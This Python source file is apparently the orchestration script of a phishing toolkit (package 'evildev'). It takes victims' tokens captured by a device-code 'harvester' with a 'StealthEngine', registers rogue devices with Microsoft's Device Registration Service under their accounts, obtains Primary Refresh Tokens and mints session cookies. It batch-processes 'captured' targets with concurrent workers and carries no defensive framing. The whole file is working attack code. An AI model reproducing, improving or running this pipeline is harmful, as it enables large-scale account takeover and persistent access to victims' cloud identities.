#!/usr/bin/env python3
"""
run_pipeline.py — one entry point for the DRS enrollment pipeline.

Stages (each is optional; skipped if its output already exists):

  token        ensure a refresh token is present in harvester state
  enroll       run enrollment.py for one target (--from-state by default)
  enroll-batch consume pending captured targets with bounded concurrency
  verify       pairing check on the cert/key/transport triple
  prt          run prt.py for one enrollment
  cookie       print a freshly minted cookie for the admin to copy

State lives on disk between stages. Nothing is passed in memory.
"""

import argparse
import importlib
import os
import subprocess
import sys
import time
from pathlib import Path
from typing import List, Optional


HERE = Path(__file__).resolve().parent
PROJECT_ROOT = HERE.parent

DRS_OUT = Path(
    os.environ.get("DRS_OUT_PATH") or (PROJECT_ROOT / "drs_out")
).resolve()


# ---------------------------------------------------------------------------
# Small helpers
# ---------------------------------------------------------------------------

def run(cmd, *, check=True, capture=False):
    """Run a subprocess, print its command, and return (rc, stdout, stderr)."""
    print(f"[run ] {' '.join(str(c) for c in cmd)}", file=sys.stderr)
    proc = subprocess.run(
        [str(c) for c in cmd],
        capture_output=capture,
        text=True,
    )
    if capture:
        if proc.stdout:
            print(proc.stdout, end="")
        if proc.stderr:
            print(proc.stderr, end="", file=sys.stderr)
    if check and proc.returncode != 0:
        raise SystemExit(
            f"stage failed (rc={proc.returncode}): "
            f"{' '.join(str(c) for c in cmd)}"
        )
    return proc.returncode, proc.stdout, proc.stderr


def newest(pattern):
    files = sorted(DRS_OUT.glob(pattern),
                   key=lambda p: p.stat().st_mtime, reverse=True)
    return files[0] if files else None


def newest_enrollment_dir():
    """Return the newest per-enrollment directory under drs_out/."""
    if not DRS_OUT.exists():
        return None
    dirs = [d for d in DRS_OUT.iterdir()
            if d.is_dir() and (d / "meta.json").exists()]
    if not dirs:
        return None
    return max(dirs, key=lambda d: d.stat().st_mtime)


def _import_local(module_name):
    if str(HERE) not in sys.path:
        sys.path.insert(0, str(HERE))
    return importlib.import_module(module_name)


def _db_module():
    try:
        import evildev.db as _db
        return _db
    except Exception:
        import db as _db
        return _db


def enrollment_dir_for_email(email: str) -> Optional[Path]:
    """Return the on-disk enrollment directory for the newest enrollment
    of this email, or None if no enrollment exists.

    Reads enrollments.dir_path from the DB. This is authoritative — it is
    written by enrollment.py when the DRS POST succeeds — and it is the
    correct source of truth when multiple workers run concurrently. Do not
    use newest_enrollment_dir() in per-email mode.
    """
    try:
        db = _db_module()
    except Exception as e:
        print(f"[!] enrollment_dir_for_email: db import failed: {e}",
              file=sys.stderr)
        return None

    try:
        row = db.get_latest_enrollment_for_email(email)
    except Exception as e:
        print(f"[!] enrollment_dir_for_email: lookup failed: {e}",
              file=sys.stderr)
        return None

    if not row:
        return None
    _enrollment_id, dir_path, _prt_at, _created_at = row
    if not dir_path:
        return None
    p = Path(dir_path)
    return p if p.exists() else None


# ---------------------------------------------------------------------------
# Pending-queue queries
# ---------------------------------------------------------------------------

def pending_captured_emails(limit: int = 0) -> List[str]:
    """Emails with status='captured', drs_enrolled_at IS NULL, and a token."""
    sql = """
        SELECT t.email
        FROM targets t
        LEFT JOIN tokens tok ON LOWER(tok.email) = LOWER(t.email)
        WHERE t.status IN ('captured', 'captured_brittle')
          AND t.email IS NOT NULL
          AND TRIM(t.email) <> ''
          AND t.email LIKE '%@%'
          AND (t.drs_enrolled_at IS NULL OR t.drs_enrolled_at = '')
          AND tok.encrypted_token IS NOT NULL
          AND tok.encrypted_token <> ''
        ORDER BY COALESCE(t.captured_at, t.created_at) ASC
    """
    if limit > 0:
        sql += f" LIMIT {int(limit)}"

    try:
        db = _db_module()
        rows = db.execute_query(sql, fetch_all=True) or []
    except Exception as e:
        print(f"[!] pending_captured_emails: query failed: {e}",
              file=sys.stderr)
        return []

    return list(dict.fromkeys(str(r[0]) for r in rows if r and r[0]))


def pending_prt_emails(limit: int = 0) -> List[str]:
    """Emails already enrolled but with no PRT yet."""
    sql = """
        SELECT t.email
        FROM targets t
        LEFT JOIN tokens tok ON LOWER(tok.email) = LOWER(t.email)
        WHERE t.status IN ('captured', 'captured_brittle')
          AND t.email IS NOT NULL
          AND TRIM(t.email) <> ''
          AND t.email LIKE '%@%'
          AND t.drs_enrolled_at IS NOT NULL
          AND t.drs_enrolled_at <> ''
          AND NOT (t.drs_enrolled_at LIKE 'FAILED:%')
          AND (t.prt_acquired_at IS NULL OR t.prt_acquired_at = '')
          AND tok.encrypted_token IS NOT NULL
          AND tok.encrypted_token <> ''
        ORDER BY t.drs_enrolled_at ASC
    """
    if limit > 0:
        sql += f" LIMIT {int(limit)}"

    try:
        db = _db_module()
        rows = db.execute_query(sql, fetch_all=True) or []
    except Exception as e:
        print(f"[!] pending_prt_emails: query failed: {e}", file=sys.stderr)
        return []

    return list(dict.fromkeys(str(r[0]) for r in rows if r and r[0]))


# ---------------------------------------------------------------------------
# Stage 1 — token
# ---------------------------------------------------------------------------

def stage_token(args):
    """Ensure the harvester state has both an access token and a refresh token."""
    sys.path.insert(0, str(HERE))
    from prt import load_from_state

    state = load_from_state() or {}
    have_access = bool(state.get("token"))
    have_refresh = bool(state.get("refresh_token"))

    if have_access and have_refresh and not args.force:
        print(f"[skip] stage 1 (token): state has access + refresh token "
              f"for {state.get('upn')}", file=sys.stderr)
        return

    if args.token_from_state_only:
        raise SystemExit(
            "state has no usable tokens and --token-from-state-only was set; "
            "run the harvester first with offline_access in scope."
        )

    print("[info] launching the harvester for a fresh token", file=sys.stderr)
    print("[info] you will be prompted to complete a device-code sign-in",
          file=sys.stderr)
    harvester = HERE / "harvester.py"
    if not harvester.exists():
        raise SystemExit(f"harvester.py not found at {harvester}")

    from harvester import TokenHarvester
    from core import StealthEngine

    h = TokenHarvester(
        client_id=args.client_id,
        tenant=args.tenant,
        scopes=[args.harvester_scope, "offline_access"],
        stealth=StealthEngine(),
    )
    dc = h.get_device_code()
    print()
    print(f"  Go to {dc['verification_uri']} and enter: {dc['user_code']}")
    print()
    token_data = h.poll_for_token(dc["device_code"])
    if not token_data.get("refresh_token"):
        raise SystemExit(
            "token obtained but no refresh_token in the response; "
            "confirm offline_access is in the scope list."
        )
    print("[ok  ] stage 1 (token): access + refresh token persisted",
          file=sys.stderr)


# ---------------------------------------------------------------------------
# Stage 2/3 — enrollment
# ---------------------------------------------------------------------------

def stage_enroll(args):
    """Single-target enrollment via --from-state (manual mode)."""
    if not args.force:
        existing = newest_enrollment_dir()
        if existing is not None and not args.email:
            print(f"[skip] stage 2/3 (enroll): using existing {existing.name}",
                  file=sys.stderr)
            return existing

    cmd = [sys.executable, HERE / "enrollment.py",
           "--confirm", "--out-dir", str(DRS_OUT)]
    if args.email:
        cmd += ["--single-email", args.email]
        if args.mark:
            cmd.append("--mark")
        if args.force_reenroll:
            cmd.append("--force-reenroll")
    else:
        cmd += ["--from-state"]
    if args.limit:
        cmd += ["--limit", str(args.limit)]
    run(cmd)

    if args.email:
        enroll_dir = enrollment_dir_for_email(args.email)
    else:
        enroll_dir = newest_enrollment_dir()

    if enroll_dir is None:
        raise SystemExit(
            "enrollment succeeded but no per-enrollment dir was created"
        )
    print(f"[ok  ] stage 2/3 (enroll): {enroll_dir.name}", file=sys.stderr)
    return enroll_dir


# ---------------------------------------------------------------------------
# Stage 4 — verify
# ---------------------------------------------------------------------------

def stage_verify(args, enroll_dir):
    cert = enroll_dir / "cert.pem"
    key = enroll_dir / "key.pem"
    tkey = enroll_dir / "transport.key.pem"
    if not (cert.exists() and key.exists() and tkey.exists()):
        raise SystemExit(
            f"stage 4: {enroll_dir} is missing cert.pem / key.pem / "
            f"transport.key.pem"
        )

    prt = _import_local("prt")
    c = prt.load_certificate(cert)
    k = prt.load_private_key(key)
    if not prt.verify_pairing(c, k):
        raise SystemExit(
            "stage 4: cert and key do not pair; re-run stage 2/3 with --force"
        )

    print(f"[ok  ] stage 4 (verify): {enroll_dir.name}", file=sys.stderr)


# ---------------------------------------------------------------------------
# Stage 5 — PRT
# ---------------------------------------------------------------------------

def stage_prt(args, enroll_dir):
    prt_file = enroll_dir / "prt.json"
    sk_file = enroll_dir / "session.key.bin"
    if prt_file.exists() and sk_file.exists() and not args.force:
        print(f"[skip] stage 5 (prt): {enroll_dir.name}", file=sys.stderr)
        return
    cmd = [sys.executable, HERE / "prt.py",
           "--enrollment-dir", str(enroll_dir)]
    if args.email:
        cmd += ["--email", args.email]
    else:
        cmd += ["--from-state"]
    run(cmd)


# ---------------------------------------------------------------------------
# Stage 6 — cookie
# ---------------------------------------------------------------------------

def stage_cookie(args, enroll_dir):
    cmd = [sys.executable, HERE / "prt_snippet.py",
           "--enrollment-dir", str(enroll_dir),
           "--raw"]
    run(cmd, capture=True)


# ---------------------------------------------------------------------------
# Per-email mode and enroll-batch
# ---------------------------------------------------------------------------

def _run_single_email(args) -> int:
    """Run stages 2–5 for exactly one target. Ignores --stage.

    This is the child-process entry point used by enroll-batch. The
    pipeline is fixed: enroll, verify, prt.
    """
    email = args.email.strip().lower()
    if not email:
        print("[!] --email requires a non-empty value", file=sys.stderr)
        return 2

    # Pre-flight: refuse to spawn enrollment.py if the stored token has no
    # DRS scope. Turns a 15–60s DRS round-trip that returns a raw 401 into
    # a clear "mail-scoped token" error immediately.
    #
    # IMPORTANT: this check reads the STORED access token directly — it does
    # NOT refresh. enrollment.py refreshes the AT immediately before the DRS
    # POST (that's the whole point of enrollment.py's acquire_access_token),
    # because DRS rejects tokens that weren't minted seconds ago. Refreshing
    # here as well would:
    #   - burn a second RT rotation on every Mint click, and
    #   - risk a race if the first rotation's DB write doesn't land before
    #     the second refresh reads the old RT, which Microsoft has already
    #     invalidated.
    # Scope is a claim in the JWT — it doesn't need a fresh AT to read.
    try:
        try:
            from enrollment import (  # type: ignore
                load_single_target as _load_single_target,
                _decrypt_stored_token as _decrypt_stored_token,
                token_has_drs_scope as _token_has_drs_scope,
            )
        except Exception:
            from evildev.enrollment import (  # type: ignore
                load_single_target as _load_single_target,
                _decrypt_stored_token as _decrypt_stored_token,
                token_has_drs_scope as _token_has_drs_scope,
            )

        try:
            _rows = _load_single_target(email) or []
        except Exception as exc:
            print(f"[!] pre-flight token lookup failed for {email}: {exc}",
                  file=sys.stderr)
            _rows = []

        if _rows:
            _stored_at = None
            try:
                _payload = _decrypt_stored_token(_rows[0].get("encrypted_token"))
                _stored_at = (_payload or {}).get("access_token")
            except Exception as exc:
                print(f"[!] pre-flight AT decrypt failed for {email}: {exc}",
                      file=sys.stderr)
                _stored_at = None

            if not _stored_at:
                print(f"[fail] {email}: no_token: stored AT missing or undecryptable",
                      file=sys.stderr)
                try:
                    _db_module().execute_query(
                        "UPDATE targets SET drs_enrolled_error = ? "
                        "WHERE LOWER(email) = LOWER(?)",
                        params=(
                            "no_token: stored AT missing or undecryptable"[:512],
                            email,
                        ),
                        commit=True,
                    )
                except Exception:
                    pass
                return 1
            if not _token_has_drs_scope(_stored_at):
                print(
                    f"[fail] {email}: auth: token does not carry "
                    f"scp=adrs_access (mail-scoped token; re-capture with "
                    f"DRS scope)",
                    file=sys.stderr,
                )
                try:
                    _db_module().execute_query(
                        "UPDATE targets SET drs_enrolled_error = ? "
                        "WHERE LOWER(email) = LOWER(?)",
                        params=(
                            "auth: token does not carry scp=adrs_access"
                            " (mail-scoped token)",
                            email,
                        ),
                        commit=True,
                    )
                except Exception:
                    pass
                return 1
    except Exception as exc:
        print(f"[!] pre-flight scope check unavailable: {exc}",
              file=sys.stderr)

    # Stage 2/3: enroll
    enroll_cmd = [
        sys.executable, str(HERE / "enrollment.py"),
        "--single-email", email,
        "--confirm",
        "--out-dir", str(DRS_OUT),
    ]
    if args.mark:
        enroll_cmd.append("--mark")
    if args.force_reenroll:
        enroll_cmd.append("--force-reenroll")

    rc, _out, _err = run(enroll_cmd, check=False, capture=True)
    if rc != 0:
        # ── PRESERVE THE DETAILED ERROR FROM enrollment.py ──
        # enrollment.py writes the AADSTS / AuthorizationError detail to
        # targets.drs_enrolled_error on failure. If we overwrite it with
        # the generic "enrollment.py rc=N" message here, drs_re_enroll's
        # pre-flight check (which looks for 'devicecapreached',
        # 'administrator policy', etc.) will never match, and every Mint
        # click on an unfixable target will waste 6–30s spawning a doomed
        # subprocess.
        #
        # Read the existing error first. Only overwrite if it's empty
        # (e.g., enrollment.py crashed before recording its own error).
        try:
            db = _db_module()
            existing = db.execute_query(
                "SELECT drs_enrolled_error FROM targets WHERE LOWER(email) = LOWER(?)",
                params=(email,),
                fetch_one=True,
            )
            existing_err = ''
            if existing and existing[0]:
                existing_err = str(existing[0]).strip()
            final_err = existing_err if existing_err else f"enrollment.py rc={rc}"
            db.execute_query(
                "UPDATE targets SET drs_enrolled_at = ?, "
                "drs_enrolled_error = ? WHERE LOWER(email) = LOWER(?)",
                params=(
                    "FAILED:" + __import__("datetime").datetime.now(
                        __import__("datetime").timezone.utc
                    ).isoformat(),
                    final_err[:512],
                    email,
                ),
                commit=True,
            )
        except Exception:
            pass
        return rc

    # Resolve the enrollment directory for THIS email. Do not use
    # newest_enrollment_dir() — concurrent workers would cross-contaminate.
    enroll_dir = enrollment_dir_for_email(email)
    if enroll_dir is None:
        print(f"[fail] {email}: enrollment succeeded but no directory found",
              file=sys.stderr)
        return 1

    # Stage 4: verify
    try:
        stage_verify(args, enroll_dir)
    except SystemExit as e:
        print(f"[fail] {email}: verify failed: {e}", file=sys.stderr)
        return 1

    # Stage 5: PRT
    prt_cmd = [
        sys.executable, str(HERE / "prt.py"),
        "--email", email,
        "--enrollment-dir", str(enroll_dir),
    ]
    rc, _out, _err = run(prt_cmd, check=False, capture=True)
    if rc != 0:
        try:
            db = _db_module()
            db.mark_prt_failed(email, error=f"prt.py rc={rc}")
        except Exception:
            pass
        return rc

    return 0


def stage_enroll_batch(args) -> int:
    """Consume the pending queues, running per-email pipelines with
    bounded concurrency. Each worker is a subprocess so a crash in one
    target cannot affect the others.
    """
    import concurrent.futures as _cf

    initial_wait = int(os.environ.get('ENROLL_BATCH_INITIAL_WAIT', '1'))
    if initial_wait > 0:
        time.sleep(initial_wait)

    limit = getattr(args, 'auto_enroll_limit', 0) or 0
    max_parallel = max(1, min(getattr(args, 'auto_enroll_max_parallel', 2), 8))

    pending_enroll = pending_captured_emails(limit=limit)
    pending_prt = pending_prt_emails(
        limit=0 if limit == 0 else max(0, limit - len(pending_enroll)),
    )

    seen = set(pending_enroll)
    pending_prt = [e for e in pending_prt if e not in seen]

    pending = pending_enroll + pending_prt
    if not pending:
        print("[skip] stage enroll-batch: no pending targets",
              file=sys.stderr)
        return 0

    print(f"[info] stage enroll-batch: "
          f"{len(pending_enroll)} to enroll, {len(pending_prt)} needing PRT, "
          f"{max_parallel} concurrent workers", file=sys.stderr)

    def process_one(email: str) -> tuple:
        child_cmd = [sys.executable, str(Path(__file__).resolve()),
                     "--email", email]
        if getattr(args, 'mark', False):
            child_cmd.append("--mark")
        if getattr(args, 'force_reenroll', False):
            child_cmd.append("--force-reenroll")
        print(f"[run ] {email}", file=sys.stderr)
        try:
            proc = subprocess.run(
                [str(c) for c in child_cmd],
                capture_output=True, text=True, timeout=900,
            )
            if proc.stdout:
                print(proc.stdout, end="")
            if proc.stderr:
                print(proc.stderr, end="", file=sys.stderr)
            return email, proc.returncode
        except subprocess.TimeoutExpired:
            print(f"[fail] {email}: child timed out after 900s",
                  file=sys.stderr)
            return email, 124
        except Exception as e:
            print(f"[fail] {email}: {e!r}", file=sys.stderr)
            return email, 1

    succeeded = 0
    failed = 0
    with _cf.ThreadPoolExecutor(max_workers=max_parallel) as pool:
        futures = {pool.submit(process_one, e): e for e in pending}
        for fut in _cf.as_completed(futures):
            email = futures[fut]
            try:
                _email, rc = fut.result()
                if rc == 0:
                    succeeded += 1
                else:
                    failed += 1
                    print(f"[fail] {email} (rc={rc})", file=sys.stderr)
            except Exception as e:
                failed += 1
                print(f"[fail] {email}: {e!r}", file=sys.stderr)

    print(f"[ok  ] stage enroll-batch complete: "
          f"{succeeded} succeeded, {failed} failed", file=sys.stderr)
    return 0 if failed == 0 else 1


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main(argv=None):
    p = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    p.add_argument("--force", action="store_true")
    p.add_argument("--stage", action="append", default=None,
                   choices=["token", "enroll", "enroll-batch", "verify",
                            "prt", "cookie"])
    p.add_argument("--limit", type=int, default=0)
    p.add_argument("--email", default=None,
                   help="Run stages 2–5 for exactly one email (used by "
                        "enroll-batch). Ignores --stage.")
    p.add_argument("--mark", action="store_true",
                   help="Set targets.drs_enrolled_at after successful "
                        "enrollment in single-email mode.")
    p.add_argument("--force-reenroll", action="store_true",
                   help="Pass through to enrollment.py --single-email to "
                        "re-enroll even if a marker exists.")
    p.add_argument("--auto-enroll-max-parallel", type=int, default=2,
                   help="Max concurrent child processes in enroll-batch mode.")
    p.add_argument("--auto-enroll-limit", type=int, default=0,
                   help="Stop after this many targets in enroll-batch mode.")
    p.add_argument("--token-from-state-only", action="store_true")
    p.add_argument("--client-id",
                   default="29d9ed98-a469-4536-ade2-f981bc1d605e")
    p.add_argument("--tenant", default="common")
    p.add_argument("--harvester-scope",
                   default="urn:ms-drs:enterpriseregistration.windows.net/.default")

    args = p.parse_args(argv)

    if args.email:
        return _run_single_email(args)

    stages = args.stage or ["token", "enroll", "verify", "prt"]

    if "enroll-batch" in stages:
        return stage_enroll_batch(args)

    if "token" in stages:
        stage_token(args)

    enroll_dir = None
    if ("enroll" in stages or "verify" in stages
            or "prt" in stages or "cookie" in stages):
        enroll_dir = newest_enrollment_dir() if not args.force else None

    if "enroll" in stages:
        enroll_dir = stage_enroll(args)
    elif enroll_dir is None:
        enroll_dir = newest_enrollment_dir()
        if enroll_dir is None:
            raise SystemExit(
                "no existing enrollment found; run with --stage enroll first"
            )

    if "verify" in stages:
        stage_verify(args, enroll_dir)
    if "prt" in stages:
        stage_prt(args, enroll_dir)
    if "cookie" in stages:
        stage_cookie(args, enroll_dir)

    return 0


if __name__ == "__main__":
    sys.exit(main())